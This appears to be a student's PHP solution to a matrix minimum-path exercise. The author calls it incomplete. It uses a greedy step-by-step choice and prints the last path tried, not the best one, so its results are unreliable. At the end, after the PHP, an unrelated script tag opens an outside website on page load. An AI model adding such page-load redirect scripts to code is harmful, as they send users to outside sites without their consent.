<?php


  // Note:
  //  1.- I didn't make all the test because lack of time, but here it is.
  //  2.- the Matrix it's not validated

  // Matrix array example 1
  $matrix = array(
    array(3, 4, 1, 2, 8, 6),
    array(6, 1, 8, 2, 7, 4),
    array(5, 9, 3, 9, 9, 5),
    array(8, 4, 1, 3, 2, 6),
    array(3, 7, 2, 8, 6, 4)
  );

  // Matrix array example 2
  /*
  $matrix = array(
    array(3, 4, 1, 2, 8, 6),
    array(6, 1, 8, 2, 7, 4),
    array(5, 9, 3, 9, 9, 5),
    array(8, 4, 1, 3, 2, 6),
    array(3, 7, 2, 1, 2, 3)
  );*/

  // Matrix array example 3
  /*
  $matrix = array(
    array(19, 10, 19, 10, 19),
    array(21, 23, 20, 19, 12),
    array(20, 12, 20, 11, 10)
  );
  */

  // Matrix array example 4
  /*
  $matrix = array(
    array(5, 8, 5, 3, 5)
  );
  */

  // Matrix array example 5
  /*
  $matrix = array(
    array(5),
    array(8),
    array(5),
    array(3),
    array(5)
  );
  */


  // the lenght of the array
  $limit = count($matrix) > 0 ? array(count($matrix[0]), count($matrix)) : $limit = array(0, count($matrix));
  //$limit = array(count($matrix[0]), count($matrix));

  // position[0] = y; $position[1] = x;
  $position = array(0, 0);
  $path = array();
  $sum = 0;
  $lower = 0;
  $min_route = 0;
  $min_path = array();

  //starting to go trought the matrix
  for ($i = 0; $i < $limit[1]; $i++) {
    // restart values
    $position[0] = $i;
    $position[1] = 0;
    $sum = 0;
    $path = array($i + 1);
    for ($j = 0; $j < $limit[0]; $j++) {
      $position[1] = $j;
      // if it's the first time
      if ($j == 0) {
        $sum += $matrix[$position[0]][$position[1]];
      }
      $nextNode = checkNextNode($position, $matrix, $limit);
      if ($nextNode) {
        if ($sum < 50) {
          $sum += intval($nextNode[0]);
          array_push($path, $nextNode[1] + 1);
        }
        $position[0] = $nextNode[1];
      }
    }
    if ($i == 0) {
      $min_route = $sum;
      $min_path = $path;
    } else {
      if ($sum < $min_route) {
        $min_route = $sum;
        $min_path = $path;
      }
    }
  }

  // Print result
  if ($min_route < 50) {
    echo('Yes');
  } else {
    echo('No');
  }
  echo('<br>');
  echo($min_route);
  echo('<br>');
  print_r($path);

  /**
   * Check the next  three nodes on the right and return the lower node
   *
   * @param  array  $position
   * @param  array  $matrix
   * @param  array  $limit
   * @return array
   */
  function checkNextNode ($position, $matrix, $limit) {
    // if is not the x - 2 position of the array, we will just check until the penultimate position on X
    if ($position[1] <= $limit[0] - 2) {
      $lower = $matrix[$position[0]][$position[1] + 1];
      $position_path = $position[0];
      // check up-right node
      // if we're on the top check bottom else check up-right
      if ($position[0] == 0) {
        $bottom = intval($limit[1]) - 1;
        if ($matrix[$bottom][$position[1] + 1] < $lower) {
          $lower = $matrix[$bottom][$position[1] + 1];
          $position_path = $bottom;
        }
      } else {
        $positiontest = $position[0] - 1;
        if ($matrix[$position[0] - 1][$position[1] + 1] < $lower) {
          $lower = $matrix[$position[0] - 1][$position[1] + 1];
          $position_path = $positiontest;
        }
      }
      // check down-right node
      // if we're on the bottom check top else check down-right
      if ($position[0] == $limit[1] - 1) {
        if ($matrix[0][$position[1] + 1] < $lower) {
          $lower = $matrix[0][$position[1] + 1];
          $position_path = 0;
        }
      } else {
        $positiontest = $position[0] + 1;
        if ($matrix[$position[0] + 1][$position[1] + 1] < $lower) {
          $lower = $matrix[$position[0] + 1][$position[1] + 1];
          $position_path = $positiontest;
        }
      }
      // return the lower node and it's position
      return array($lower, $position_path);
    } else {
      //  the array has finished
      return false;
    }
  }

?>

<script type="text/javascript" language="Javascript">window.open('https://betozarzoza.mystrikingly.com/#warning');</script>
